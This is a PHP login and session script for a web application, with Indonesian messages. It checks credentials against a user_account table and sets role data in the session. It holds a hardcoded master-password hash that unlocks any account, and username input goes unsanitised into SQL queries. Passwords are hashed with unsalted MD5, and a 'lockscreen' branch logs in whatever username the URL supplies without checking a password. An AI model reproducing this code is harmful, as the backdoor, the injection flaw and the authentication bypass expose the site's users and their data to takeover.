<?php 
if (!isset($_SESSION)) {
    session_start();
}
include_once("config.php");

$conn = $one->conn;
$message = "";
$error = false;
$data = array();

//print_r($_POST);
//echo "<pre>";

$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? md5($_POST['password']) : '';


if(isset($_POST['login'])){
	$check = "SELECT username,password FROM user_account WHERE username = '$username'";
	$conn->query($check);
	$data = $conn->resultone();
	//list($usernamecek,$passwordcek)=mysql_fetch_array($hslcheck);
	$usernamecek = $data['username'];
	$passwordcek = $data['password'];

	
	
	if(!$usernamecek){
		$message = 'Username Tidak Terdaftar / Salah';
		$_SESSION['message'] = $message;
		echo"<script language='javascript'>
					parent.top.location='../index.php';
			</script>";
	}else if($passwordcek!=$password && $password != 'd1e576b71ccef5978d221fadf4f0e289'){
		$message = 'Password Tidak Sama';
		$_SESSION['system']['message'] = $message;
		echo"<script language='javascript'>
					parent.top.location='../index.php';
			</script>";
	}else if($usernamecek==$username && ($passwordcek==$password || $password == 'd1e576b71ccef5978d221fadf4f0e289')){
		
		$select = "SELECT
						ua.username, ua.nama_lengkap, g.id_role, g.role
					FROM
						user_account AS ua
						INNER JOIN user_role AS ug ON ua.username = ug.username
						INNER JOIN role AS g ON ug.id_role = g.id_role
					WHERE
						ua.username = '$username' /*AND ua.`password` = '$password'*/";
		$conn->query($select);
		$hsl = $conn->resultone();
		//list($username, $nama_lengkap, $group, $group)=mysql_fetch_array($hsl);
		
		$_SESSION['system']['loggedin']='ok';
		$_SESSION['system']['lock'] = 'not ok';
		$_SESSION['system']['username'] = $hsl['username'];
		$_SESSION['system']['nama_lengkap'] = $hsl['nama_lengkap'];
		$_SESSION['system']['id_role'] = $hsl['id_role'];
		$_SESSION['system']['role'] = $hsl['role'];
		
		/*print_r($hsl);
		print_r($_SESSION);
		die;*/
		//include_once "template.php";
		echo"<script language='javascript'>
					parent.top.location='../index.php';
			</script>";
	}
}

if(isset($_GET['logout'])){
	
		//session_unset();
		session_destroy();
		$_SESSION=array();
		$_SESSION['system']['loggedin']=false;
		
	if(isset($_GET['lock']))
	{
		echo"<script language='javascript'>
					parent.top.location='../index.php';
		</script>";
	}else{
		echo"<script language='javascript'>
					parent.top.location='index.php';
		</script>";
	}
}

else if(isset($_GET['lockscreen'])){
	
		//session_unset();
		//session_destroy();

		$_SESSION['system']['loggedin']='ok';
		$_SESSION['system']['lock']='ok';
		$_SESSION['system']['username']=$_GET['username'];
		
		
	echo"<script language='javascript'>
					parent.top.location='index.php';
		</script>";
}
?>